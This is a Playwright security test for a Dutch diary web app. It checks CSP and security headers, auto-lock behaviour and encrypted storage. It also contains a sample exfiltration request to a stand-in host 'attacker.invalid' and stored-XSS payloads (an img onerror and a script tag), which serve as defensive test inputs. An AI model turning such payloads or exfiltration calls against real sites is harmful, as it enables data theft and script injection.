import assert from 'node:assert/strict';
import path from 'node:path';
import { chromium } from 'playwright';
import { createPhonePreviewServer } from '../scripts/phone-preview-server.mjs';

const server=createPhonePreviewServer(path.resolve('apps/prototype-web/dist'),()=>null);
await new Promise(resolve=>server.listen(0,'127.0.0.1',resolve));
const base=`http://127.0.0.1:${server.address().port}`, browser=await chromium.launch({channel:'msedge',headless:true});
try {
  const context=await browser.newContext({viewport:{width:390,height:844},reducedMotion:'reduce'});
  const page=await context.newPage();page.setDefaultTimeout(12000);
  const errors=[];page.on('pageerror',e=>errors.push(e.message));
  await page.clock.install({time:new Date('2026-11-15T18:00:00Z')});
  const response=await page.goto(base), headers=response.headers();
  assert.match(headers['content-security-policy'],/frame-ancestors 'none'/);assert.ok(!headers['content-security-policy'].includes("'unsafe-eval'"));assert.equal(headers['x-frame-options'],'DENY');
  assert.match(headers['strict-transport-security'],/max-age=31536000/);assert.match(headers['permissions-policy'],/camera=\(\)/);
  await page.evaluate(()=>{const script=document.createElement('script');script.textContent='window.inlineScriptExecuted=true';document.body.append(script);});
  assert.equal(await page.evaluate(()=>window.inlineScriptExecuted),undefined,'Inline script must be blocked');
  assert.equal(await page.evaluate(async()=>{try{await fetch('https://attacker.invalid/exfiltrate',{method:'POST',body:'SYNTHETIC'});return true;}catch{return false;}}),false,'Unapproved network destinations must be blocked');
  await page.getByRole('button',{name:'Start mijn dagboek',exact:true}).click();
  await page.getByLabel('Wachtwoord',{exact:true}).fill('security-local-key');await page.getByLabel('Herhaal wachtwoord',{exact:true}).fill('security-local-key');
  await page.getByRole('dialog').getByRole('button',{name:'Start mijn dagboek',exact:true}).click();await page.getByRole('dialog').waitFor({state:'hidden'});
  await page.getByRole('navigation',{name:'Mobiele navigatie'}).getByRole('button',{name:'Dagboek',exact:true}).click();
  await page.getByRole('button',{name:'Notitie schrijven',exact:true}).click();
  const note='PRIVATE-XSS <img src=x onerror="window.noteExecuted=true"> <script>window.noteExecuted=true</script>';
  await page.getByLabel('Wat wil je onthouden?',{exact:true}).fill(note);await page.getByRole('button',{name:'Bewaar mijn notitie',exact:true}).click();await page.getByRole('dialog').waitFor({state:'hidden'});
  await page.getByText(note,{exact:true}).waitFor();assert.equal(await page.locator('.journal-entry script,.journal-entry img').count(),0);assert.equal(await page.evaluate(()=>window.noteExecuted),undefined);
  await page.clock.runFor(301000);await page.getByRole('button',{name:'Ontgrendel dagboek',exact:true}).waitFor();
  assert.ok(!(await page.locator('main').innerText()).includes('PRIVATE-XSS'),'Auto-lock must remove diary text from the UI');
  assert.ok(!(await page.evaluate(()=>localStorage.getItem('rhythm.vault.v1'))).includes('PRIVATE-XSS'));
  await page.getByRole('button',{name:'Ontgrendel dagboek',exact:true}).click();await page.getByLabel('Wachtwoord',{exact:true}).fill('security-local-key');await page.getByRole('button',{name:'Ontgrendel mijn dagboek',exact:true}).click();await page.getByRole('dialog').waitFor({state:'hidden'});
  await page.evaluate(()=>{Object.defineProperty(document,'hidden',{configurable:true,get:()=>true});document.dispatchEvent(new Event('visibilitychange'));});
  await page.clock.runFor(61000);await page.getByRole('button',{name:'Ontgrendel dagboek',exact:true}).waitFor();
  await page.evaluate(()=>{delete document.hidden;document.dispatchEvent(new Event('visibilitychange'));});
  assert.deepEqual(errors,[]);
  console.log('Security browser checks passed: enforced headers/CSP, blocked script and exfiltration destination, escaped journal payloads, idle/background auto-lock and no plaintext diary in storage.');
} finally {await browser.close();await new Promise(resolve=>server.close(resolve));}
